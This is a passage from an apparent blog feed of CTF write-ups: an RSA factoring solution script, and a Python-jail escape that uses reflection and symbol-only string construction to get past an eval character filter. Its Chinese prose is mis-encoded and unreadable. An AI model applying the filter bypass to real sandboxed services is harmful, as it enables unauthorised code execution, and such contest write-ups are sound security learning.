„ÄÇ</p><p>Ê†πÊçÆÊï∞Â≠¶Êé®ÁêÜÊàñËÄÖÂ§ßËÉÜÁûéÁåúÂæóÂà∞ <code>x=2y</code> ÔºåÁÑ∂Âêé‰ª£ÂÖ•ÁîüÊàêpÂíåqÔºå‰ª•<code>pq==n</code> ‰∏∫Êù°‰ª∂ÁàÜÁ†¥yÂç≥ÂèØ„ÄÇ</p><p>Êù•Ëá™ <a href="https://mp.weixin.qq.com/s/3qvuVd9tBK3J-Q9vBMGxwA" target="_blank" rel="noopener">ÂÆòÊñπWP</a> ÁöÑËß£È¢òËÑöÊú¨Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show that if 4ab - 1 divides (4a**2 - 1)**2, then a = b.</span></span><br><span class="line"><span class="comment"># suppose y be a large prime and x + 1 is another large prime.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from this condition with help of previous fact we can deduce that:</span></span><br><span class="line"><span class="comment"># ==&gt; we take 2a = x and b = y, so: 2xy - 1 | (x**2 - 1)**2 ==&gt; x = 2y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># assert gmpy.is_prime(y) + gmpy.is_prime(x+1) + ((x**2 - 1)**2 % (2*x*y - 1) + 2) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 = 1 + 1 + 2 ** 2018</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># so we have x = 2y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gmpy.next_prime(x**3 + y**3) # ==&gt; p = gmpy.next_prime(8*y**3 + y**3) = gmpy.next_prime(9*y**3)</span></span><br><span class="line"><span class="comment"># q = gmpy.next_prime(x**2*y + y**2*x) # ==&gt; q = gmpy.next_prime(4*y**2*y + y**2*(2y)) = gmpy.next_prime(6*y**3)</span></span><br><span class="line"><span class="comment"># n = p * q # ==&gt; n = p * q ~= (9*y**3) * (6*y**3) = 54*y**6</span></span><br><span class="line"><span class="comment"># So we can factor n with knowing n ~= 54*y**6</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line">enc = <span class="number">73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now we calculate the 5th root of n//45 to find the y:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iroot</span><span class="params">(k, n)</span>:</span></span><br><span class="line">   UB = <span class="number">1</span></span><br><span class="line">   <span class="keyword">while</span> pow(UB, k) &lt; n:</span><br><span class="line">       UB *= <span class="number">2</span></span><br><span class="line">   LB = UB / <span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span> UB - LB &gt; <span class="number">1</span>:</span><br><span class="line">       M = (LB + UB) // <span class="number">2</span></span><br><span class="line">       midToK = pow(M, k)</span><br><span class="line">       <span class="keyword">if</span> midToK &lt; n:</span><br><span class="line">           LB = M</span><br><span class="line">       <span class="keyword">elif</span> n &lt; midToK:</span><br><span class="line">           UB = M</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> M</span><br><span class="line">   <span class="keyword">if</span> pow(UB, k) == n:</span><br><span class="line">       <span class="keyword">return</span> UB</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> LB</span><br><span class="line"></span><br><span class="line">y = iroot(<span class="number">6</span>, n // <span class="number">54</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">   <span class="keyword">if</span> gmpy.is_prime(y):</span><br><span class="line">       <span class="keyword">if</span> gmpy.next_prime(<span class="number">9</span>*y**<span class="number">3</span>) * gmpy.next_prime(<span class="number">6</span>*y**<span class="number">3</span>) == n:</span><br><span class="line">           <span class="keyword">print</span> <span class="string">'Found:'</span>, <span class="string">'y ='</span>, y</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       y += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">2</span>*y</span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>)</span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">flag = long_to_bytes(pow(enc, d, n))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag ='</span>, flag</span><br></pre></td></tr></table></figure><p>Ê≤°ÊúâgmpyÂ∫ìÔºåÁ®çÂæÆÊîπ‰∫Ü‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line">enc = <span class="number">73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br><span class="line">y = gmpy2.iroot( n // <span class="number">54</span>,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"near:"</span>,y</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">  k=y+i</span><br><span class="line">  <span class="keyword">if</span> gmpy2.is_prime(k):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.next_prime(<span class="number">9</span>*y**<span class="number">3</span>) * gmpy2.next_prime(<span class="number">6</span>*y**<span class="number">3</span>) == n:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'Found: offset=%d y=%d'</span>%(i,k)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">x ,y= <span class="number">2</span>*k,k</span><br><span class="line">p = gmpy2.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>)</span><br><span class="line">q = gmpy2.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">flag = long_to_bytes(pow(enc, d, n))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag ='</span>, flag</span><br><span class="line"><span class="comment"># near: 12996881452793504643693526905573881980920361170852213106754463438614382317225798822548048130268953176983864771790449810537027331620960357639880338702048953</span></span><br><span class="line"><span class="comment"># Found: offset=0 y=12996881452793504643693526905573881980920361170852213106754463438614382317225798822548048130268953176983864771790449810537027331620960357639880338702048953</span></span><br><span class="line"><span class="comment"># flag = flag&#123;e01c9eb8078ea9bbac035ea68021c070&#125;</span></span><br></pre></td></tr></table></figure><p>ÈòüÂèãMadsÊé®Âá∫<code>x=2y</code> ‰∫ÜÔºåÂèØÊÉúÊ≤°Ëøõ‰∏ÄÊ≠•ËØï‰∏ã„ÄÇ‰ªñÂú®ÂçöÂÆ¢ÂÜô‰∫Ü <a href="https://madsome.one/2018/09/03/%E8%83%96%E5%93%88%E5%8B%83%E4%B8%80%E9%81%93RSA/" target="_blank" rel="noopener">Êé®ÁêÜËøáÁ®ã</a> ÔºåÂèØËÉΩ‰∏çÂ§™‰∏•Ë∞®Ôºå‰ΩÜÂ∑ßÂ¶ôÂÅáËÆæÂèòÈáèÂÖ≥Á≥ªÊù•Ê∂àÂÖÉÁöÑÊÄùË∑ØÂÄºÂæóÂ≠¶‰π†„ÄÇ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Problem&quot;&gt;&lt;a href=&quot;#Problem&quot; class=&quot;headerlink&quot; title=&quot;Problem&quot;&gt;&lt;/a&gt;Problem&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TJCTF2018ÔºöMirror Mirror‚Äî‚Äî‰∏ÄÁßçÁªïËøáPythonÊ≤ôÁÆ±Â≠óÁ¨¶ÈôêÂà∂ÁöÑÊñπÊ≥ï</title>
    <link href="https://findneo.github.io/180814-python-jail-escape/"/>
    <id>https://findneo.github.io/180814-python-jail-escape/</id>
    <published>2018-08-14T11:24:11.000Z</published>
    <updated>2019-01-25T23:21:37.072Z</updated>
    
    <content type="html"><![CDATA[<p><img src="1534248479004.png" alt="1534248479004"></p><p>ÈÄöËøáncËøûÊé•<code>problem1.tjctf.org:8004</code> ,È¢òÁõÆÊèê‰æõ‰∏Ä‰∏™Python‰∫§‰∫íÁªàÁ´Ø„ÄÇ</p><p>Ê†πÊçÆÈ¢òÁõÆÊèèËø∞ Reflection ÂèØÁü•‰∏éPythonÂèçÂ∞ÑÊú∫Âà∂ÊúâÂÖ≥„ÄÇ</p><p>ÊâÄË∞ìÂèçÂ∞ÑÊú∫Âà∂Â∞±ÊòØËÉΩÂ§üÈÄöËøáÂêëÂáΩÊï∞‰º†ÂÖ•Â≠óÁ¨¶‰∏≤ÂèÇÊï∞ÔºåÊù•ÊìçÁ∫µÊåáÂÆöÂØπË±°ÁöÑÁ±ªÂûã„ÄÅÂ±ûÊÄß„ÄÅÊñπÊ≥ïÂíåÁ±ª„ÄÇ</p><blockquote><p>A Python script can find out about the type, class, attributes and methods of an object. This is referred to as <strong>reflection</strong> or <strong>introspection</strong>. See also <a href="https://en.wikibooks.org/wiki/Python_Programming/Metaclasses" target="_blank" rel="noopener">Metaclasses</a>.</p><p>Reflection-enabling functions include type(), isinstance(), callable(), dir() and getattr().</p><p>‚Äî‚Äî <a href="https://en.wikibooks.org/wiki/Python_Programming/Reflection" target="_blank" rel="noopener">https://en.wikibooks.org/wiki/Python_Programming/Reflection</a> </p></blockquote><p>ËøôÈáå‰ΩøÁî®<code>dir()</code> ÂáΩÊï∞Êü•Áúã<code>get_flag</code> ÁöÑÂ±ûÊÄß„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Œª nc problem1.tjctf.org <span class="number">8004</span></span><br><span class="line">Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;console&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: get_flag() takes exactly <span class="number">1</span> argument (<span class="number">0</span> given)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag(<span class="string">'1'</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> <span class="keyword">not</span> a valid character</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag(<span class="string">'@'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;console&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/home/app/problem.py"</span>, line <span class="number">23</span>, <span class="keyword">in</span> get_flag</span><br><span class="line">    <span class="keyword">if</span>(eval(input) == super_secret_string):</span><br><span class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span></span><br><span class="line"><span class="meta">    @</span></span><br><span class="line">    ^</span><br><span class="line">SyntaxError: unexpected EOF <span class="keyword">while</span> parsing</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(get_flag)</span><br><span class="line">[<span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__closure__'</span>, <span class="string">'__code__'</span>, <span class="string">'__defaults__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__format__'</span>, <span class="string">'__get__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__globals__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__module__'</span>, <span class="string">'__name__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'func_closure'</span>, <span class="string">'func_code'</span>, <span class="string">'func_defaults'</span>, <span class="string">'func_dict'</span>, <span class="string">'func_doc'</span>, <span class="string">'func_globals'</span>, <span class="string">'func_name'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(get_flag.func_code)</span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__cmp__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__le__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'co_argcount'</span>, <span class="string">'co_cellvars'</span>, <span class="string">'co_code'</span>, <span class="string">'co_consts'</span>, <span class="string">'co_filename'</span>, <span class="string">'co_firstlineno'</span>, <span class="string">'co_flags'</span>, <span class="string">'co_freevars'</span>, <span class="string">'co_lnotab'</span>, <span class="string">'co_name'</span>, <span class="string">'co_names'</span>, <span class="string">'co_nlocals'</span>, <span class="string">'co_stacksize'</span>, <span class="string">'co_varnames'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_code.co_consts</span><br><span class="line">(<span class="keyword">None</span>, <span class="string">'this_is_the_super_secret_string'</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">122</span>, <span class="number">44</span>, <span class="number">95</span>, <span class="string">' is not a valid character'</span>, <span class="string">'%\xcb'</span>, <span class="string">"You didn't guess the value of my super_secret_string"</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>Êé¢Á¥¢ÂêéÁåúÊµãË¶ÅÊ±ÇÂêë<code>get_flag()</code> ÂáΩÊï∞‰º†ÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåevalÊâßË°åÂêéÁ≠â‰∫ésuper_secret_stringÂ∞±‰ºöËøîÂõûflag„ÄÇ</p><p><code>48, 57, 65, 90, 97, 122, 44, 95</code> Â∫îËØ•ÊÑèÂë≥ÁùÄASCIIÂÄº‰∏∫ 48~57Ôºå65~90Ôºå97~122Ôºå44Âíå95ÁöÑÂ≠óÁ¨¶‰∏çË¢´ÂÖÅËÆ∏Ôºå‰πüÂ∞±ÊòØ <code>[a-zA-Z0-9,_]</code> Ë¢´Á¶ÅÁî®‰∫ÜÔºåÊµãËØï‰∏Ä‰∏ãÂèëÁé∞Á°ÆÂÆûÂ¶ÇÊ≠§„ÄÇÊ≠§Â§ñ <code>&#39;%\xcb&#39;</code> Â≠óÁ¨¶‰∏≤‰πüÊòØ‰∏Ä‰∏™ÊèêÁ§∫„ÄÇ</p><p>ËøôÈ¢òÂ∫îËØ•ÊòØÂØπ <a href="https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/" target="_blank" rel="noopener">A python‚Äôs escape from PlaidCTF jail</a> ÁöÑÂ§çÁé∞„ÄÇ‰∏ªË¶ÅÁõÆÊ†áÊòØÈÄöËøáÊúâÈôêÁöÑÂ≠óÁ¨¶ ÈõÜ <code>({[&lt;&#39;&quot;:~%c&gt;]})</code> ÊûÑÈÄ†Âá∫‰ªªÊÑèÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ‰∏ªË¶ÅÊÄùË∑ØÂ¶Ç‰∏ãÔºö</p><ul><li><p><code>[]&lt;{}</code> ÈÄªËæëÂÄº‰∏∫TrueÔºåÁ≠â‰ª∑‰∫é1Ôºõ<code>[]&lt;[]</code> ÈÄªËæëÂÄº‰∏∫FalseÔºåÁ≠â‰ª∑‰∫é0„ÄÇ</p></li><li><p>Áî±1Âíå0ÔºåÁªìÂêàÊåâ‰ΩçÂèñÂèç<code>~</code> ÂíåÁßª‰Ωç <code>&lt;&lt;</code> ÂèØ‰ª•ÂæóÂà∞‰ªªÊÑèÊï¥Êï∞„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brainfuckize</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>, <span class="string">"([]&lt;[])"</span>, <span class="string">"(&#123;&#125;&lt;[])"</span>][nb + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % brainfuckize(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % brainfuckize(nb / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="comment"># ÂÆûÈôÖ‰∏äËøô‰∏™ÂáΩÊï∞Â∞±Ë∂≥Â§ü‰∫ÜÔºå‰ΩÜÁîüÊàêÁöÑÁªìÊûúÈïøÂ∫¶‰ºöÊØîÁ¨¨‰∏Ä‰∏™ÈïøÂæàÂ§ö„ÄÇ</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"([]&lt;[])"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"~%s"</span> % f(~n) <span class="keyword">if</span> n % <span class="number">2</span> <span class="keyword">else</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % f(n / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> f(<span class="number">5</span>), eval(brainfuckize(<span class="number">5</span>)) == <span class="number">5</span></span><br><span class="line"><span class="comment"># ~(~(~(~([]&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[])) True</span></span><br></pre></td></tr></table></figure></li><li><p>Â≠óÁ¨¶‰∏≤ <code>%\xcb</code> Áî±<code>%</code> Âíå <code>\xcb)</code> ‰∏§‰∏™Â≠óÁ¨¶ÊûÑÊàê„ÄÇ<code>repr(&#39;%\xcb&#39;)</code> ‰ºöÂæóÂà∞‰∏Ä‰∏™‰∏ÉÂ≠óÁ¨¶ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂÖ∂‰∏≠ÂåÖÂê´<code>%</code> Âíå <code>c</code> „ÄÇÁªìÂêà‰∏äÈù¢ÁöÑÂæóÂà∞ÁöÑÊï¥Êï∞Â∞±ÂèØ‰ª•ÊûÑÈÄ†‰ªªÊÑèÂ≠óÁ¨¶‰∫Ü„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> repr(<span class="string">'%\xcb'</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> i,</span><br><span class="line">...</span><br><span class="line"><span class="string">' % \ x c b '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="string">'%\xcb'</span>`:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> i,</span><br><span class="line">...</span><br><span class="line"><span class="string">' % \ x c b '</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>`<span class="string">'%\xcb'</span>`[<span class="number">1</span>::<span class="number">3</span>]</span><br><span class="line"><span class="string">'%c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>`<span class="string">'%\xcb'</span>`[<span class="number">1</span>::<span class="number">3</span>]%<span class="number">97</span> == chr(<span class="number">97</span>)</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>Âú®Python2 ‰∏≠ ÔºåÂèçÂºïÂè∑ÂåÖË£πÊòØ <code>repr()</code> ÁöÑÂø´Êç∑ÊñπÂºèÔºåÊïàÊûúÂÆåÂÖ®‰∏ÄËá¥„ÄÇÂú®Python3‰∏≠ÂèçÂºïÂè∑Ë¢´Â∫üÈô§‰∫Ü„ÄÇ</p></li><li><p>Êé•‰∏ãÊù•Â∞±ÂèØ‰ª•ÊûÑÈÄ†‰ªªÊÑèÂ≠óÁ¨¶‰∏≤Âπ∂‰º†Áªô<code>get_flag()</code>‰∫Ü„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>, <span class="string">"([]&lt;[])"</span>, <span class="string">"(&#123;&#125;&lt;[])"</span>][nb + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % bf(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % bf(nb / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_single_char</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"`'%\\xcb'`["</span> + bf(<span class="number">1</span>) + <span class="string">"::"</span> + bf(<span class="number">3</span>) + <span class="string">"]%("</span> + bf(ord(c)) + <span class="string">")"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secret = <span class="string">"this_is_the_super_secret_string"</span></span><br><span class="line">cmd = <span class="string">'get_flag("%s")'</span> % (<span class="string">'+'</span>.join(gen_single_char(i) <span class="keyword">for</span> i <span class="keyword">in</span> secret))</span><br><span class="line"><span class="keyword">print</span> cmd</span><br><span class="line"><span class="comment"># 